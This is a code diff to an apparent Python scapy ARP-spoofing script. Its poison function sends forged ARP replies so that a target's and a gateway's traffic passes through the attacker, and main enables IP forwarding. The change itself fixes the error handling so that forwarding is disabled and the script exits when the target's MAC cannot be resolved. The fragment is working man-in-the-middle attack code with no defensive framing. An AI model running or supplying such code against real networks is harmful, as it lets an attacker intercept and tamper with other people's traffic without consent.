@@ -8,7 +8,7 @@ def poison(target_ip,gateway_ip, gateway_mac,target_mac):
     send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
 
 #################################################################
-def get_mac(ip,interface):
+def get_mac(ip,interface):  # arp ping
     conf.verb=0
     # sending and recieving packets by scapy module
     ans,unans= srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2, iface=interface,inter=0.1)
@@ -31,12 +31,11 @@ def main():
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # Enabling IP forward in linux
     try:
         target_mac=get_mac(target_ip,interface)
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")   # Disabling IP forward in linux
+
+    except:
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")  # Disabling IP forward in linux
         print("Target mac address is not available ")
         sys.exit(1)
-    except:
-        pass
-
     try:
          gateway_mac=get_mac(gateway_ip)
     except:
